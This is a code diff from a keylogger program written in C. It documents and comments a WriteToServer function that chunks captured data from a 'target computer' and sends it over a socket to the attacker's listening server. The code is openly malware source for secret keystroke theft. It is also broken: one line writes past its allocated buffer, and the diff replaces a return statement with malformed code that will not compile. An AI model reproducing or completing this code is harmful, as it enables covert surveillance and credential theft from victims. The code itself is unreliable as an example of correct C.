@@ -61,31 +61,59 @@ bool startListeningClient()
 return true;
 }
 /**
-    Mockup the writeToServer function for further development at this point it is limited
-    but will be developed further.
+    Title: WriteToServer
+    Description: takes in a pointer to a character to a buffer  and writes it to the server, if the message is greater
+    then 4096 bytes. then it is broken up into 4096 byte blocks and sent to the listening server. on the event of an 
+    error this function should return false and let the keylogger process attempt to reconnect, if all messages are recived
+    by the client and the socket has not been closed, then this process should return true. 
 
-    TODO:  break messages down into 4096 byte capturesti
-    TODO:  write extensive documenta
-
-    Title WriteToServer
+    @param buffer, the byte buffer to be written from the target computer to the server.
+    
+    @return a boolean value indicating if the buffer was successfully written to the server.
 */
 
 bool WriteToServer(const char* buffer)
 {
+   /*
+     if the length of the buffer is greater then 4096 bytes 
+   */
     if(strlen(buffer)>0x1000)
     {
+      /*
+        allocate a temporary buffer to storew packets of the appropriate size to be sent to the server
+      */
         char* temp = (char*)malloc(0x1000);
+       /*
+          keep sending data untill the buffer is empty.
+       */
         for(int x=0; (strlen(buffer)-(x*0x1000))>0;x++)
         {
+         /*
+            if the buffer is still longer then 4096 bytes then send exactly 4096 bytes to the server
+         */
             if(strlen(buffer+(x*0x1000))>0x1000)
                 {
+                    /*
+                       zero out the temp buffer memory.
+                    */
                     memset(temp,0,0x1000);
+                    /*
+                       coppy the bytes to be sent over to the temporary buffer
+                    */
                     memcpy(temp,buffer+(x*0x1000),0x1000);
+                    /*
+                      set the last byte in the buffer to zero.
+                    */
                     *(temp+0x1000)=0x00;
+                    /*
+                      if an error occures while attempting to send data over the socket then return false
+                    */
                     if (send(keylogServer,temp,0x1000,0) ==SOCKET_ERROR)
                         return false;
 
                 }
+           /*
+           */
             else
                 {
 
@@ -93,8 +121,7 @@ bool WriteToServer(const char* buffer)
                     memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
                     if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                         return false;
-                    printf("%s",temp);
-                    return true;
+                    printf("%s",temp);0
                 }
             printf("%s",temp);
         }
